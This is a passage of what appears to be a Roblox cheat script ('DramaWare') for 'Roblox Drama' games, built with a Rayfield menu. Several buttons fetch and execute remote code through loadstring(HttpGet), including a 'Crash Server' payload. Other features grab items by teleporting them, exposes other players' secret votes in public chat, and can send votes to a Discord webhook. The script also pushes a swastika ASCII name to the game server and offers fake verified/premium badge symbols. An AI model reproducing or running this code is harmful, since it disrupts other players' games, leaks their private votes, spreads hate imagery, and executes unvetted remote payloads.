            local team = Teams:FindFirstChild(teamName)
            return team and team.TeamColor.Color or Color3.fromRGB(169, 169, 169)
        end

        local function applyNameTag(p)
            local character = p.Character
            if not character then return end
            local head = character:FindFirstChild("Head")
            if not head then return end
            local old = head:FindFirstChild("UsernameTag")
            if old then old:Destroy() end
            local tag = Instance.new("BillboardGui")
            tag.Name = "UsernameTag"
            tag.Adornee = head
            tag.Size = UDim2.new(0, 120, 0, 20)
            tag.StudsOffset = Vector3.new(0, 3, 0)
            tag.AlwaysOnTop = true
            tag.Parent = head
            local text = Instance.new("TextLabel")
            text.Size = UDim2.new(1, 0, 1, 0)
            text.BackgroundTransparency = 1
            text.Text = p.Name
            text.TextScaled = true
            text.Font = Enum.Font.GothamMedium
            text.TextColor3 = getPlayerTeamColor(p)
            text.TextStrokeTransparency = 0.5
            text.Parent = tag
        end

        if Value == true then
            _G.UsernameTagConns = {}
            for _, p in ipairs(Players:GetPlayers()) do
                applyNameTag(p)
                local conn = p.CharacterAdded:Connect(function()
                    task.wait(0.1)
                    applyNameTag(p)
                end)
                table.insert(_G.UsernameTagConns, conn)
            end
            local addedConn = Players.PlayerAdded:Connect(function(p)
                local conn = p.CharacterAdded:Connect(function()
                    task.wait(0.1)
                    applyNameTag(p)
                end)
                table.insert(_G.UsernameTagConns, conn)
            end)
            table.insert(_G.UsernameTagConns, addedConn)
        elseif Value == false then
            if _G.UsernameTagConns then
                for _, conn in ipairs(_G.UsernameTagConns) do
                    conn:Disconnect()
                end
                _G.UsernameTagConns = {}
            end
            for _, p in ipairs(Players:GetPlayers()) do
                local character = p.Character
                if not character then continue end
                local head = character:FindFirstChild("Head")
                if head then
                    local old = head:FindFirstChild("UsernameTag")
                    if old then old:Destroy() end
                end
            end
        end
    end,
})

ClientTab:CreateButton({
    Name = "Halloween Map",
    Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/nVKRChaK'))()
    end,
})

if isCamp then
    ClientTab:CreateButton({
        Name = "Christmas Map",
        Callback = function()
            loadstring(game:HttpGet('https://pastebin.com/raw/ju6mhwzn'))()
        end,
    })
    ClientTab:CreateButton({
        Name = "Valentines Map",
        Callback = function()
            local winterColor = Color3.fromRGB(255, 152, 220)
            local greenColor = Color3.fromRGB(148, 190, 129)
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") then
                    local bcName = obj.BrickColor.Name:lower()
                    if bcName == "olivine" or bcName:find("green") then
                        obj.Color = greenColor
                        obj.Material = Enum.Material.SmoothPlastic
                    end
                end
                if obj:IsA("MeshPart") and obj.Name == "Leaves" then
                    obj.Color = winterColor
                    obj.Material = Enum.Material.SmoothPlastic
                end
            end
            
            pcall(function()
                local bgMountains = workspace.Map["Roblox Drama: Camp"].Map.Mountains["Background Mountains"]
                for _, v in pairs(bgMountains:GetDescendants()) do
                    if v:IsA("MeshPart") and v.Name == "MeshPart" then
                        if v.BrickColor == BrickColor.new("Grime") then
                            v.Color = winterColor
                            v.Material = Enum.Material.SmoothPlastic
                        end
                    end
                    if v:IsA("MeshPart") and v.Name == "Water" then
                        if v.BrickColor == BrickColor.new("Bright bluish green") then
                            v.Color = winterColor
                            v.Material = Enum.Material.Glass
                        end
                    end
                end
                local lakeWater = workspace.Map["Roblox Drama: Camp"].Map.Lake:FindFirstChild("Water")
                if lakeWater and lakeWater:IsA("MeshPart") then
                    lakeWater.Color = winterColor
                    lakeWater.Material = Enum.Material.Glass
                end
            end)
        end,
    })
end

ToolsTab:CreateSection("Utilities")

ToolsTab:CreateButton({
    Name = "FE Genesis Sniper",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Sniper"))()
    end,
})

ToolsTab:CreateButton({
    Name = "Auto Reset Finale",
    Callback = function()
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        autoWinObby = true

        local function startObbyLoop()
            task.spawn(function()
                while autoWinObby do
                    local assets = workspace:FindFirstChild("Assets")
                    if assets then
                        local finish = assets:FindFirstChild("Finish", true)
                        if finish then
                            finish.CanCollide = false
                            finish.Transparency = 1
                            task.wait()
                            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                finish.Position = player.Character.HumanoidRootPart.Position
                            end
                        end
                    end
                    task.wait(0.1)
                end
            end)
        end

        startObbyLoop()

        workspace.DescendantAdded:Connect(function(obj)
            if not autoWinObby then return end
            if obj.Name == "Finish" and obj:IsA("BasePart") then
                startObbyLoop()
            end
        end)

        local winsValue = isCamp and "CampWins" or isExpedition and "ExpeditionWins" or "MoviesWins"
        local reanimateRunning = false

        local function watchPlayer(p)
            task.spawn(function()
                local ok, ds = pcall(function()
                    return p:WaitForChild("DataStore", 10)
                end)
                if not ok or not ds then return end
                local ok2, winsObj = pcall(function()
                    return ds:WaitForChild(winsValue, 10)
                end)
                if not ok2 or not winsObj then return end
                winsObj.Changed:Connect(function(newValue)
                    if reanimateRunning then return end
                    reanimateRunning = true
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxcheatck/reanimatescript/main/script.lua", true))()
                    task.wait(25)
                    if getgenv().Stop then getgenv().Stop() end
                    reanimateRunning = false
                end)
            end)
        end

        for _, p in ipairs(Players:GetPlayers()) do
            watchPlayer(p)
        end

        Players.PlayerAdded:Connect(function(p)
            watchPlayer(p)
        end)

        Rayfield:Notify({
            Title = "Auto Reset Finale",
            Content = "Enabled! Watching " .. #Players:GetPlayers() .. " players.",
            Duration = 4,
            Image = "bell-ring",
        })
    end,
})

SettingsTab:CreateSection("Configuration")
local _dwSelectedConfig = nil
local _dwInitialList = DramaWare_ListConfigs()
local _dwConfigDropdown = SettingsTab:CreateDropdown({
    Name = "Load Config",
    Options = _dwInitialList,
    CurrentOption = {_dwInitialList[1]},
    MultipleOptions = false,
    Flag = "DramaWareConfigDropdown",
    Callback = function(Options)
        if Options[1] and Options[1] ~= "(no saved configs)" then
            _dwSelectedConfig = Options[1]
            DramaWare_LoadConfig(_dwSelectedConfig)
            Rayfield:Notify({ Title = "Config Loaded", Content = 'Loaded "' .. _dwSelectedConfig .. '".', Duration = 4, Image = "refresh-cw" })
        end
    end,
})

SettingsTab:CreateInput({
    Name = "Save Config",
    PlaceholderText = "Enter name and press Enter...",
    RemoveTextAfterFocusLost = true,
    Callback = function(text)
        if text and text ~= "" then
            DramaWare_SaveConfig(text)
            Rayfield:Notify({ Title = "Config Saved", Content = 'Saved as "' .. text .. '".', Duration = 4, Image = "save" })
            local newList = DramaWare_ListConfigs()
            _dwConfigDropdown:Refresh(newList)
            _dwSelectedConfig = text
        end
    end,
})

SettingsTab:CreateButton({
    Name = "Delete Config",
    Callback = function()
        if not _dwSelectedConfig or _dwSelectedConfig == "(no saved configs)" then
            Rayfield:Notify({ Title = "Nothing Selected", Content = "Pick a config from the dropdown first.", Duration = 4, Image = "alert-circle" })
            return
        end
        local path = "DramaWare/Configs/" .. _dwSelectedConfig .. ".json"
        local deleted = false
        pcall(function()
            if isfile(path) then delfile(path) deleted = true end
        end)
        if deleted then
            Rayfield:Notify({ Title = "Config Deleted", Content = '"' .. _dwSelectedConfig .. '" deleted.', Duration = 4, Image = "trash-2" })
            local newList = DramaWare_ListConfigs()
            _dwConfigDropdown:Refresh(newList)
            _dwSelectedConfig = (newList[1] ~= "(no saved configs)") and newList[1] or nil
        else
            Rayfield:Notify({ Title = "Not Found", Content = 'No config named "' .. _dwSelectedConfig .. '".', Duration = 4, Image = "alert-circle" })
        end
    end,
})

SettingsTab:CreateDivider()

MainTab:CreateSection("Statue")
MainTab:CreateButton({
    Name = "Get Safety Statue",
    Callback = function()
        for i, v in pairs(workspace.Idols:GetDescendants()) do
            if v.Name == "Bag" then
                v.hit.CanCollide = false
                v.hit.Transparency = 1
                wait()
                v.hit.Position = player.Character.Torso.Position
                wait()
            elseif v.Name == "SafetyStatue" then
                v.hit.CanCollide = false
                v.hit.Transparency = 1
                wait()
                v.hit.Position = player.Character.Torso.Position
                wait()
            end
        end
    end,
})

MainTab:CreateButton({
    Name = "Get Statue When It Spawns",
    Callback = function()
        local function tryGrab(v)
            if v:IsA("BasePart") and v.Name == "hit" then
                local parent = v.Parent
                if parent and (parent.Name == "Bag" or parent.Name == "SafetyStatue") then
                    task.wait(0.1)
                    v.CanCollide = false
                    v.Transparency = 1
                    task.spawn(function()
                        while v and v.Parent do
                            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                v.CFrame = player.Character.HumanoidRootPart.CFrame
                            end
                            task.wait(0.05)
                        end
                    end)
                end
            end
        end
        
        if not _G.StatueGrabConn then
            _G.StatueGrabConn = workspace.DescendantAdded:Connect(function(v)
                tryGrab(v)
            end)
        end
        for _, v in pairs(workspace:GetDescendants()) do
            tryGrab(v)
        end
    end,
})

MainTab:CreateButton({
    Name = "Notify Who Has Statue",
    Callback = function()
        pcall(function()
            local v = game.ReplicatedStorage.Season.Twists.Idol
            if v.Value == "" then
                Rayfield:Notify({
                    Title = "Statue Owner",
                    Content = "No one currently has the statue or it didn't spawn.",
                    Duration = 4,
                    Image = "bell-ring",
                })
            else
                local c = game.ReplicatedStorage.Season.Players:FindFirstChild(v.Value).Value
                Rayfield:Notify({
                    Title = "Statue Owner",
                    Content = c .. " has the statue",
                    Duration = 4,
                    Image = "bell-ring",
                })
            end
        end)
    end,
})

MainTab:CreateToggle({
    Name = "Safety Bag ESP",
    CurrentValue = false,
    Flag = "SafetyBagESP",
    Callback = function(Value)
        if Value then
            for _, bag in ipairs(workspace.Idols:GetDescendants()) do
                if bag.Name == "Bag" and bag:IsA("Model") then
                    local part = bag.PrimaryPart or bag:FindFirstChildWhichIsA("BasePart")
                    if part then
                        if not bag:FindFirstChild("BagHighlight") then
                            local highlight = Instance.new("Highlight")
                            highlight.Name = "BagHighlight"
                            highlight.FillTransparency = 1
                            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                            highlight.Parent = bag
                        end
                        if not bag:FindFirstChild("BagESP") then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Name = "BagESP"
                            billboard.Size = UDim2.new(0, 220, 0, 60)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
                            billboard.Adornee = part
                            billboard.Parent = bag
                            local text = Instance.new("TextLabel")
                            text.Size = UDim2.new(1, 0, 1, 0)
                            text.BackgroundTransparency = 1
                            text.Text = "SAFETY BAG"
                            text.TextColor3 = Color3.fromRGB(255, 255, 255)
                            text.TextStrokeTransparency = 0
                            text.TextScaled = true
                            text.Font = Enum.Font.GothamBold
                            text.Parent = billboard
                        end
                    end
                end
            end
        else
            for _, bag in ipairs(workspace:GetDescendants()) do
                if bag.Name == "Bag" then
                    if bag:FindFirstChild("BagHighlight") then bag.BagHighlight:Destroy() end
                    if bag:FindFirstChild("BagESP") then bag.BagESP:Destroy() end
                end
            end
        end
    end,
})

MainTab:CreateToggle({
    Name = "Safety Statue ESP",
    CurrentValue = false,
    Flag = "SafetyStatueESP",
    Callback = function(Value)
        if Value then
            for _, statue in ipairs(workspace.Idols:GetDescendants()) do
                if statue.Name == "SafetyStatue" and statue:IsA("Model") then
                    local part = statue.PrimaryPart or statue:FindFirstChildWhichIsA("BasePart")
                    if part then
                        if not statue:FindFirstChild("StatueHighlight") then
                            local highlight = Instance.new("Highlight")
                            highlight.Name = "StatueHighlight"
                            highlight.FillTransparency = 1
                            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                            highlight.Parent = statue
                        end
                        if not statue:FindFirstChild("StatueESP") then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Name = "StatueESP"
                            billboard.Size = UDim2.new(0, 260, 0, 70)
                            billboard.StudsOffset = Vector3.new(0, 4, 0)
                            billboard.AlwaysOnTop = true
                            billboard.Adornee = part
                            billboard.Parent = statue
                            local text = Instance.new("TextLabel")
                            text.Size = UDim2.new(1, 0, 1, 0)
                            text.BackgroundTransparency = 1
                            text.Text = "SAFETY STATUE"
                            text.TextColor3 = Color3.fromRGB(255, 255, 255)
                            text.TextStrokeTransparency = 0
                            text.TextScaled = true
                            text.Font = Enum.Font.GothamBold
                            text.Parent = billboard
                        end
                    end
                end
            end
        else
            for _, statue in ipairs(workspace:GetDescendants()) do
                if statue.Name == "SafetyStatue" then
                    if statue:FindFirstChild("StatueHighlight") then statue.StatueHighlight:Destroy() end
                    if statue:FindFirstChild("StatueESP") then statue.StatueESP:Destroy() end
                end
            end
        end
    end,
})

MainTab:CreateSection("Round Info")
MainTab:CreateButton({
    Name = "Detect Round",
    Callback = function()
        pcall(function()
            local t = game.ReplicatedStorage.Season.Twists:FindFirstChild("CurrentTwist")
            if t then
                local roundNames = {
                    Undecided  = "Round not decided yet - the twist hasn't been set.",
                    normal     = "Normal Round - Casual round, nothing special.",
                    purge      = "Purge Round - This will be a purge round.",
                    double     = "Double Elimination - Two people will be eliminated.",
                    singleswap = "Sike Round - Eliminated player gets swapped to another team.",
                    exile      = "Exile Vote Round - There will be an exile vote.",
                    votereveal = "Vote Reveal - Kyle will expose the votes this round.",
                }
                local content = roundNames[t.Value] or ("Unknown round type: " .. tostring(t.Value))
                Rayfield:Notify({ Title = "Round Detected", Content = content, Duration = 6, Image = "bell-ring" })
            end
        end)
    end,
})

local autoDetectRoundConn = nil
MainTab:CreateToggle({
    Name = "Auto Detect Round",
    CurrentValue = false,
    Flag = "AutoDetectRound",
    Callback = function(Value)
        if Value then
            pcall(function()
                local t = game.ReplicatedStorage.Season.Twists:FindFirstChild("CurrentTwist")
                if t then
                    autoDetectRoundConn = t:GetPropertyChangedSignal("Value"):Connect(function()
                        local roundNames = {
                            normal = "Normal Round - Casual round, nothing special.",
                            purge = "Purge Round - This will be a purge round.",
                            ["double"] = "Double Elimination - Two people will be eliminated.",
                            singleswap = "Sike Round - Eliminated player gets swapped to another team.",
                            exile = "Exile Vote Round - There will be an exile vote.",
                            votereveal = "Vote Reveal - Kyle will expose the votes this round.",
                        }
                        local content = roundNames[t.Value]
                        if content then
                            Rayfield:Notify({ Title = "Round Detected", Content = content, Duration = 6, Image = "bell-ring" })
                        end
                    end)
                end
            end)
        else
            if autoDetectRoundConn then
                autoDetectRoundConn:Disconnect()
                autoDetectRoundConn = nil
            end
        end
    end,
})

MainTab:CreateButton({
    Name = "Detect Teamers",
    Callback = function()
        local Players = game:GetService("Players")
        local RS = game:GetService("ReplicatedStorage")
        local season = RS:FindFirstChild("Season")
        if not season then return end
        local playersFolder = season:FindFirstChild("Players")
        if not playersFolder then return end
        local function getInGameName(p)
            local data = playersFolder:FindFirstChild(p.Name)
            if data and data.Value ~= "" then
                return data.Value
            end
            return p.Name
        end
        local found = false
        for i, p1 in ipairs(Players:GetPlayers()) do
            for j, p2 in ipairs(Players:GetPlayers()) do
                if j > i then
                    local ok, areFriends = pcall(function()
                        return p1:IsFriendsWith(p2.UserId)
                    end)
                    if ok and areFriends then
                        local igName1 = getInGameName(p1)
                        local igName2 = getInGameName(p2)
                        found = true
                        Rayfield:Notify({
                            Title = "Teamer Detected!",
                            Content = igName1 .. " is teaming with " .. igName2,
                            Duration = 8,
                            Image = "shield-alert",
                        })
                        task.wait(0.6)
                    end
                end
            end
        end
        if not found then
            Rayfield:Notify({
                Title = "No Teamers Found",
                Content = "No friend pairs detected in this lobby.",
                Duration = 5,
                Image = "check-circle",
            })
        end
    end,
})

MainTab:CreateButton({
    Name = "Fling/Restart Day (Reanimate)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxcheatck/reanimatescript/main/script.lua", true))()
    end,
})

MainTab:CreateButton({
    Name = "Limb Reanimation (crashes game before it starts, may not work)",
    Callback = function()
        local settings = _G
        settings["Use default animations"] = true
        settings["Local character transparency level"] = 1
        settings["Disable character scripts"] = true
        settings["Fake character should collide"] = true
        settings["Parent real character to fake character"] = false
        settings["Respawn character"] = true
        settings["Instant respawn"] = false
        settings["Hide HumanoidRootPart"] = false
        settings["PermaDeath fake character"] = true
        settings["R15 Reanimate"] = false
        settings["Click Fling"] = false
        settings["Anti-Fling"] = true
        settings["Hide RootPart Distance"] = CFrame.new(255, 255, 0)
        settings["Allow tool equipping"] = false
        settings["Client sided display mode"] = 1
        settings["Fallback prompt"] = true
        settings["Respawn mode"] = "ServerBreakJoints"
        settings["Names to exclude from transparency"] = {}
        loadstring(game:HttpGet("https://raw.githubusercontent.com/somethingsimade/CurrentAngleV4/refs/heads/main/v4.lua"))()
    end,
})

MainTab:CreateButton({
    Name = "Destroy Long Names",
    Callback = function()
        local function destroyLongTextElements(parent)
            for _, element in ipairs(parent:GetDescendants()) do
                if pcall(function() return element.Text end) and type(element.Text) == "string" and #element.Text > 750 then
                    element:Destroy()
                end
            end
        end
        local function scanGame()
            for _, service in ipairs(game:GetChildren()) do
                destroyLongTextElements(service)
            end
            destroyLongTextElements(game:GetService("Players").LocalPlayer.PlayerGui)
            destroyLongTextElements(game:GetService("ReplicatedStorage"))
            destroyLongTextElements(game:GetService("Workspace"))
        end
        scanGame()
        game.DescendantAdded:Connect(function(descendant)
            if pcall(function() return descendant.Text end) and type(descendant.Text) == "string" and #descendant.Text > 750 then
                descendant:Destroy()
            end
        end)
    end,
})

MainTab:CreateButton({
    Name = "Remove Cutscene",
    Callback = function()
        local events = game:GetService("ReplicatedStorage"):FindFirstChild("Events")
        local camEvent = events and events:FindFirstChild("Camera")
        if camEvent then
            camEvent:Destroy()
        end
        local char = player.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                camera.CameraType = Enum.CameraType.Custom
                camera.CameraSubject = hum
            end
        end
    end,
})

MainTab:CreateSection("Voting")
MainTab:CreateToggle({
    Name = "Notify Votes",
    CurrentValue = false,
    Flag = "NotifyVotes",
    Callback = function(Value)
        if Value then
            local RS = game:GetService("ReplicatedStorage")
            local season = RS:FindFirstChild("Season")
            local voting = season and season:FindFirstChild("Voting")
            local votes = voting and voting:FindFirstChild("Votes")
            if votes then
                voteConn = votes.ChildAdded:Connect(function(v)
                    local r_val = season.Players:FindFirstChild(v.Value)
                    local d_val = season.Players:FindFirstChild(v.Name)
                    local r = r_val and r_val.Value or v.Value
                    local d = d_val and d_val.Value or v.Name
                    Rayfield:Notify({ Title = "Vote Update", Content = r .. " voted for " .. d, Duration = 3, Image = "bell-ring" })
                end)
            end
        else
            if voteConn then voteConn:Disconnect() voteConn = nil end
        end
    end,
})

MainTab:CreateToggle({
    Name = "Print Votes in /console",
    CurrentValue = false,
    Flag = "PrintVotes",
    Callback = function(Value)
        if Value then
            local RS = game:GetService("ReplicatedStorage")
            local season = RS:FindFirstChild("Season")
            local voting = season and season:FindFirstChild("Voting")
            local votes = voting and voting:FindFirstChild("Votes")
            if votes then
                printVotesConn = votes.ChildAdded:Connect(function(v)
                    local r_val = season.Players:FindFirstChild(v.Value)
                    local d_val = season.Players:FindFirstChild(v.Name)
                    local r = r_val and r_val.Value or v.Value
                    local d = d_val and d_val.Value or v.Name
                    print(r .. " voted for " .. d)
                end)
            end
        else
            if printVotesConn then printVotesConn:Disconnect() printVotesConn = nil end
        end
    end,
})

MainTab:CreateToggle({
    Name = "Expose Votes",
    CurrentValue = false,
    Flag = "ExposeVotes",
    Callback = function(Value)
        if Value then
            local RS = game:GetService("ReplicatedStorage")
            local season = RS:FindFirstChild("Season")
            local voting = season and season:FindFirstChild("Voting")
            local votes = voting and voting:FindFirstChild("Votes")
            if votes then
                exposeVotesConn = votes.ChildAdded:Connect(function(v)
                    local r_val = season.Players:FindFirstChild(v.Value)
                    local d_val = season.Players:FindFirstChild(v.Name)
                    local r = r_val and r_val.Value or v.Value
                    local d = d_val and d_val.Value or v.Name
                    game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(r .. " voted for " .. d)
                end)
            end
        else
            if exposeVotesConn then exposeVotesConn:Disconnect() exposeVotesConn = nil end
        end
    end,
})

MainTab:CreateToggle({
    Name = "Notify Jury Votes",
    CurrentValue = false,
    Flag = "NotifyJuryVotes",
    Callback = function(Value)
        if Value then
            local RS = game:GetService("ReplicatedStorage")
            local season = RS:FindFirstChild("Season")
            local jury = season and season:FindFirstChild("Jury")
            if jury then
                juryVoteConns = {}
                local function watchJuror(j)
                    local l = j:WaitForChild("List")
                    local conn = l.ChildAdded:Connect(function(v)
                        local voter = j.Value
                        local votee = v.Value
                        if season.Players:FindFirstChild(v.Name) then
                            votee = season.Players[v.Name].Value
                        end
                        Rayfield:Notify({ Title = "Jury Vote", Content = voter .. " voted for " .. votee, Duration = 3, Image = "bell-ring" })
                    end)
                    table.insert(juryVoteConns, conn)
                end
                for _, j in pairs(jury:GetChildren()) do
                    watchJuror(j)
                end
                local addConn = jury.ChildAdded:Connect(watchJuror)
                table.insert(juryVoteConns, addConn)
            end
        else
            if juryVoteConns then
                for _, c in pairs(juryVoteConns) do c:Disconnect() end
                juryVoteConns = nil
            end
        end
    end,
})

if isCamp then
    MainTab:CreateToggle({
        Name = "Notify & Print Exile Votes",
        CurrentValue = false,
        Flag = "ExileVotes",
        Callback = function(Value)
            if Value then
                local twists = game.ReplicatedStorage:FindFirstChild("Season") and game.ReplicatedStorage.Season:FindFirstChild("Twists")
                local ev = twists and twists:FindFirstChild("ExileVoting")
                local votes = ev and ev:FindFirstChild("Votes")
                if votes then
                    exileVotesConn = votes.ChildAdded:Connect(function(v)
                        local r_val = game.ReplicatedStorage.Season.Players:FindFirstChild(v.Value)
                        local d_val = game.ReplicatedStorage.Season.Players:FindFirstChild(v.Name)
                        local r = r_val and r_val.Value or v.Value
                        local d = d_val and d_val.Value or v.Name
                        local s = r .. " voted to exile " .. d

                        Rayfield:Notify({
                            Title = "Exile Vote",
                            Content = s,
                            Duration = 3.5,
                            Image = "bell-ring",
                        })

                        print(s)
                    end)
                end
            else
                if exileVotesConn then
                    exileVotesConn:Disconnect()
                    exileVotesConn = nil
                end
            end
        end,
    })
end

local _whUrl = ""
local _whVC, _whEC
local function sendWH(msg)
    if not _whUrl or _whUrl == "" then return end
    local body = game:GetService("HttpService"):JSONEncode({content = msg})
    local req = http_request or request or (syn and syn.request)
    if req then pcall(req, {Url = _whUrl, Body = body, Method = "POST", Headers = {["content-type"] = "application/json"}}) end
end

MainTab:CreateInput({
    Name = "Webhook URL",
    PlaceholderText = "https://discord.com/api/webhooks/...",
    RemoveTextAfterFocusLost = false,
    Callback = function(t) _whUrl = t end,
})

MainTab:CreateToggle({
    Name = "Send Votes to Webhook",
    CurrentValue = false,
    Flag = "SendVotesWH",
    Callback = function(v)
        if _whVC then _whVC:Disconnect(); _whVC = nil end
        if v then
            local RS = game:GetService("ReplicatedStorage")
            local season = RS:FindFirstChild("Season")
            local voting = season and season:FindFirstChild("Voting")
            local votes = voting and voting:FindFirstChild("Votes")
            if votes then
                _whVC = votes.ChildAdded:Connect(function(vote)
                    pcall(function()
                        local r_val = season.Players:FindFirstChild(vote.Value)
                        local d_val = season.Players:FindFirstChild(vote.Name)
                        local r = r_val and r_val.Value or vote.Value
                        local d = d_val and d_val.Value or vote.Name
                        sendWH(r .. " voted for " .. d)
                    end)
                end)
            end
        end
    end,
})

MainTab:CreateDivider()

-- universal tab
_BuildUniversalTab(UniversalTab)

CharactersTab:CreateSection("Free")
CharactersTab:CreateButton({
    Name = "Male Character",
    Callback = function()
        game:GetService("ReplicatedStorage").Events.Buy:FireServer("Gender", "Male")
    end,
})

CharactersTab:CreateButton({
    Name = "Female Character",
    Callback = function()
        game:GetService("ReplicatedStorage").Events.Buy:FireServer("Gender", "Female")
    end,
})

CharactersTab:CreateSection("Paid")
CharactersTab:CreateButton({
    Name = "Crash Server",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/shsicidjdhisjs/crash-server/main/crash"))()
    end,
})

local ArtCharMap = {
    ["Swastika"] = [[
    ████╗░░░████████████╗
    ████║░░░████████████║
    ████║░░░████╔═══════╝
    ████║░░░████║░░░░░░░░
    ████████████████████╗
    ████████████████████║
    ╚═══════████╔═══████║
    ░░░░░░░░████║░░░████║
    ████████████║░░░████║
    ████████████║░░░████║
    ╚═══════════╝░░░╚═══╝
    ]],
    ["Guy"] = [[
    ───────▄▀▀▀▀▀▀▀▀▀▀▄▄
    ────▄▀▀░░░░░░░░░░░░░▀▄
    ──▄▀░░░░░░░░░░░░░░░░░░▀▄
    ──█░░░░░░░░░░░░░░░░░░░░░▀▄
    ─▐▌░░░░░░░░▄▄▄▄▄▄▄░░░░░░░▐▌
    ─█░░░░░░░░░░░▄▄▄▄░░▀▀▀▀▀░░█
    ▐▌░░░░░░░▀▀▀▀░░░░░▀▀▀▀▀░░░▐▌
    █░░░░░░░░░▄▄▀▀▀▀▀░░░░▀▀▀▀▄░█
    █░░░░░░░░░░░░░░░░▀░░░▐░░░░░▐▌
    ▐▌░░░░░░░░░▐▀▀██▄░░░░░░▄▄▄░▐▌
    ─█░░░░░░░░░░░▀▀▀░░░░░░▀▀██░░█
    ─▐▌░░░░▄░░░░░░░░░░░░░▌░░░░░░█
    ──▐▌░░▐░░░░░░░░░░░░░░▀▄░░░░░█
    ───█░░░▌░░░░░░░░▐▀░░░░▄▀░░░▐▌
    ───▐▌░░▀▄░░░░░░░░▀░▀░▀▀░░░▄▀
    ───▐▌░░▐▀▄░░░░░░░░░░░░░░░░█
    ───▐▌░░░▌░▀▄░░░░▀▀▀▀▀▀░░░█
    ───█░░░▀░░░░▀▄░░░░░░░░░░▄▀
    ──▐▌░░░░░░░░░░▀▄░░░░░░▄▀
    ─▄▀░░░▄▀░░░░░░░░▀▀▀▀█▀
    ▀░░░▄▀░░░░░░░░░░▀░░░▀▀▀▀▄▄▄▄▄
    ]],
    ["Hacker"] = [[
    ███████████████████████████████
    ████╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬████
    ██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬███████╬╬╬╬╬╬╬╬╬███████╬╬╬█
    █╬╬██╬╬╬╬███╬╬╬╬╬╬╬███╬╬╬╬██╬╬█
    █╬██╬╬╬╬╬╬╬██╬╬╬╬╬██╬╬╬╬╬╬╬██╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬╬█████╬╬╬╬╬╬╬╬╬╬╬█████╬╬╬╬█
    █╬╬█████████╬╬╬╬╬╬╬█████████╬╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
    █╬╬╬▓▓▓▓╬╬╬╬╬╬╬█╬╬╬╬╬╬╬▓▓▓▓╬╬╬█
    █╬╬▓▓▓▓▓▓╬╬█╬╬╬█╬╬╬█╬╬▓▓▓▓▓▓╬╬█
    █╬╬╬▓▓▓▓╬╬██╬╬╬█╬╬╬██╬╬▓▓▓▓╬╬╬█
    █╬╬╬╬╬╬╬╬██╬╬╬╬█╬╬╬╬██╬╬╬╬╬╬╬╬█
    █╬╬╬╬╬████╬╬╬╬███╬╬╬╬████╬╬╬╬╬█
    █╬╬╬╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬╬╬╬█
    ██╬╬█╬╬╬╬╬╬╬╬█████╬╬╬╬╬╬╬╬█╬╬██
    ██╬╬██╬╬╬╬╬╬███████╬╬╬╬╬╬██╬╬██
    ██╬╬▓███╬╬╬████╬████╬╬╬███▓╬╬██
    ███╬╬▓▓███████╬╬╬███████▓▓╬╬███
    ███╬╬╬╬▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬███
    ████╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬████
    █████╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬█████
    ██████╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬██████
    ███████╬╬╬╬╬╬╬███╬╬╬╬╬╬╬███████
    ████████╬╬╬╬╬╬███╬╬╬╬╬╬████████
    █████████╬╬╬╬╬███╬╬╬╬╬█████████
    ███████████╬╬╬╬█╬╬╬╬███████████
    ███████████████████████████████
    ]],
}

local selectedArtChar = "Guy"
CharactersTab:CreateDropdown({
    Name = "ASCII Art Character Names",
    Options = { "Skull", "Guy", "Hacker" },
    CurrentOption = {"Swastika"},
    MultipleOptions = false,
    Flag = "ArtCharDropdown",
    Callback = function(Options)
        selectedArtChar = Options[1]
    end,
})

CharactersTab:CreateButton({
    Name = "Buy Symbol Character (@60)",
    Callback = function()
        game:GetService("ReplicatedStorage").Events.Buy:FireServer("Character", ArtCharMap[selectedArtChar])
    end,
})

local selectedSymbol = ""
local characterName = ""
local symbolMap = {
    ["None"] = "",
    [" Verified"] = "\u{e000}",
    [" Premium"] = "\u{e001}",
    [" Robux"] = "\u{e002}",
}

CharactersTab:CreateDropdown({
    Name = "Select a Symbol for Buy Character",
    Options = { "None", " Verified", " Premium", " Robux" },
    CurrentOption = {"None"},
    MultipleOptions = false,
    Flag = "SymbolDropdown",
    Callback = function(Options)
        selectedSymbol = symbolMap[Options[1]] or ""
    end,
})

CharactersTab:CreateInput({
    Name = "Enter the Character Name You Want",
    CurrentValue = "",
